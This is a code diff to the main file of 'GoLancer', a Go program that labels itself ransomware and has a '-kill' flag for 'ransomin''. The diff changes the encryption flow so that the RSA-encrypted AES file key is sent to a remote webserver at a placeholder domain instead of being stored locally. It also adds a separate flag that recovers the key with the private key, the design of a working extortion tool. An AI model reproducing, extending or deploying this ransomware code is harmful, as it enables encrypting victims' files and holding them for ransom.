@@ -10,12 +10,15 @@ import (
 
 	"github.com/WesEfird/GoLancer/cryptutil"
 	"github.com/WesEfird/GoLancer/sysinfo"
+	"github.com/WesEfird/GoLancer/webhelper"
 )
 
 var privateKey *rsa.PrivateKey
 var publicKey rsa.PublicKey
 var aesKey []byte
 var fileList []string
+
+const addr = "https://domain.example"
 
 var wg sync.WaitGroup
 
@@ -24,6 +27,7 @@ func main() {
 	gFlag := flag.Bool("g", false, "Generate new RSA key-pair and save to disk")
 	killFlag := flag.Bool("kill", false, "!!DANGER!! Setting this flag will start ransomin'")
 	dFlag := flag.Bool("d", false, "Start decryption proccess, must have private.pem file in same directory as GoLancer binary")
+	aFlag := flag.Bool("a", false, "Decrypts AES key using RSA private key")
 
 	flag.Parse()
 
@@ -42,8 +46,8 @@ func main() {
 		fmt.Println("Generating AES key.")
 		aesKey = cryptutil.GenerateAES()
 
-		fmt.Println("Encrypting AES key and saving to disk.")
-		cryptutil.SaveAESKey(cryptutil.EncryptAESKey(aesKey, publicKey), "golancer.key")
+		fmt.Println("Encrypting AES key and sending to webserver.")
+		webhelper.SendKey(cryptutil.EncryptAESKey(aesKey, publicKey), addr)
 
 		fmt.Println("Gathering file list.")
 		fileList = sysinfo.GetFileList()
@@ -55,17 +59,28 @@ func main() {
 	}
 
 	if *dFlag {
-		fmt.Println("Loading private key.")
-		privateKey = cryptutil.LoadRSAPrivateKey("private.pem")
-
-		fmt.Println("Loading and decrypting AES key.")
-		aesKey = cryptutil.DecryptAESKey(cryptutil.LoadAESKey("golancer.key"), *privateKey)
+		fmt.Println("Loading AES key.")
+		aesKey = cryptutil.LoadAESKey("golancer.key")
 
 		fmt.Println("Loading file list.")
 		fileList = sysinfo.LoadFileList("files.txt")
 
 		fmt.Println("Starting decryption process.")
 		startEncryptors(true)
+	}
+
+	if *aFlag {
+		fmt.Println("Loading encrypted AES key.")
+		aesKey = cryptutil.LoadAESKey("golancer-e.key")
+
+		fmt.Println("Loading RSA private key.")
+		privateKey = cryptutil.LoadRSAPrivateKey("private.pem")
+
+		fmt.Println("Decrypting key.")
+		aesKey = cryptutil.DecryptAESKey(aesKey, *privateKey)
+
+		fmt.Println("Saving decrypted AES key to disk.")
+		cryptutil.SaveAESKey(aesKey, "golancer.key")
 	}
 
 }
